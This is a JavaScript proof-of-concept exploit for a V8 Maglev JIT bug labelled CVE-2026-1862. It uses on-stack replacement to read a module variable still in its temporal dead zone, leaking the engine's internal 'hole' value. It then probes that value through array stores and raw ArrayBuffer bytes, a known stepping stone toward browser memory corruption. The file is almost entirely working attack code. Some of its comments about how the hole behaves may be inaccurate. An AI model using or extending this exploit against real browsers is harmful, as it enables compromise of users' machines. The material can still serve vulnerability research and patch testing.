// CVE-2026-1862 PoC — Maglev module variable hole leak
// V8 Maglev's CanBeTheHoleValue() does not handle LoadTaggedField opcode
// Module variables (export let) are stored in Cells, accessed via LdaModuleVariable
// Maglev lowers this to LoadTaggedField(cell, Cell::kValueOffset) and REMOVES the hole check
// If the variable is in TDZ (Temporal Dead Zone), the hole value leaks silently

// Strategy: Use Maglev OSR (On-Stack Replacement) in a hot loop
// The loop runs millions of iterations, triggering Maglev compilation
// The module variable access only happens on the LAST iteration (after OSR)
// At that point, x is still in TDZ (export let x = ... hasn't executed yet)

function leak() {
  // Hot loop to trigger Maglev OSR compilation
  // Maglev typically triggers after ~10000-50000 iterations
  for (let i = 0; i < 5000000; i++) {
    if (i === 4999999) {
      // This branch is NEVER taken during interpreter execution
      // Only executed after Maglev OSR compiles the loop
      // Maglev has NO hole check for this LoadTaggedField
      return x; // Module variable in TDZ = the_hole
    }
  }
}

// Phase 1: Leak the hole value
// x is in TDZ at this point (export let x = 42 hasn't executed yet)
let leaked = leak();

// Phase 2: Initialize x (too late, hole already leaked)
export let x = 42;

// Phase 3: Detect and report
// the_hole is an Oddball HeapObject where:
//   typeof hole === "undefined"  (V8 internal: Oddball::kUndefined type)
//   hole === undefined → FALSE   (they are different objects!)
//   hole == undefined → TRUE     (abstract equality coerces)
//   hole === null → FALSE
let isHole = (typeof leaked === "undefined" && leaked !== undefined);

// Also test: in some V8 versions, the hole has specific behaviors
let tests = {
  type: typeof leaked,
  isUndefined: leaked === undefined,
  eqUndefined: leaked == undefined,
  isNull: leaked === null,
  isHole: isHole,
  // Try numeric conversion
  asNumber: Number(leaked),
  // Try string conversion (may throw for hole)
  value: "pending"
};

try {
  tests.value = String(leaked);
} catch(e) {
  tests.value = "toString_threw:" + e.message;
}

// Try to use hole in array operations
try {
  let dblArr = [1.1, 2.2, 3.3];
  dblArr[0] = leaked;
  tests.dblStore = "ok";
  tests.dblRead = dblArr[0];
  tests.dblType = typeof dblArr[0];

  // Check if storing hole changed the array's element kind
  tests.dblLen = dblArr.length;
  tests.dblHas0 = 0 in dblArr;

  // Read raw bytes via ArrayBuffer if hole is stored as float64
  let buf = new ArrayBuffer(8);
  let f64 = new Float64Array(buf);
  let u32 = new Uint32Array(buf);
  f64[0] = dblArr[0];
  tests.rawLo = "0x" + u32[0].toString(16);
  tests.rawHi = "0x" + u32[1].toString(16);
} catch(e) {
  tests.dblError = e.message;
}

// Object array test
try {
  let objArr = [{}];
  objArr[0] = leaked;
  tests.objStore = "ok";
  tests.objRead = String(objArr[0]);
  tests.objType = typeof objArr[0];
  tests.objHas0 = 0 in objArr;
} catch(e) {
  tests.objError = e.message;
}

// Report results
if (typeof document !== 'undefined') {
  document.title = "CVE1862:" + JSON.stringify(tests);
}
